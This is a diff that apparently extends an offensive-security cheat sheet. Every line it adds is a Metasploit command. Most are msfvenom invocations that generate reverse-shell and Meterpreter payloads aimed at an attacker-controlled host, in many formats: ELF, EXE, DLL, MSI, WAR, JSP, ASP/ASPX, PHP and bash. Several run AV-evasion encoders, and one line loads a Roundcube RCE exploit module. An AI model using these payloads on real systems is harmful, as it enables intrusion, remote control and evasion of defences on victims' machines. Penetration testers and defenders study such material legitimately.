@@ -23,3 +23,28 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f elf >
 msfvenom -p windows/meterpreter/reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f exe > meterpreter.exe
 msfvenom -p windows/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f exe > shell.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f exe -o reverse.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f dll > backupscript.dll
+msfconsole -q -x "use exploit/multi/http/roundcube_auth_rce_cve_2025_49113"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f war > shell.war
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf > shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o shell.elf
+msfvenom -p windows/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST="$LHOST" LPORT="$LPORT" -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f dll -o shell.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f dll -o shell.dll
+msfvenom -p windows/x64/exec cmd="$COMMAND" -f dll -o payload.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f msi -o shell.msi
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f asp > shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f aspx > shell.aspx
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f raw > shell.jsp
+msfvenom -p php/reverse_php LHOST="$LHOST" LPORT="$LPORT" -o shell.php
+msfvenom -p cmd/unix/reverse_bash LHOST="$LHOST" LPORT="$LPORT"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -e x64/xor -i 5 -f exe -o shell.exe
+msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -k -e x86/shikata_ga_nai -a x86 --platform windows -f exe -o shell.exe -i 5
+msfconsole -q
+msfconsole -r handler.rc
+meterpreter_handler_linux "$LHOST" "$LPORT"
+meterpreter_handler_windows "$LHOST" "$LPORT"
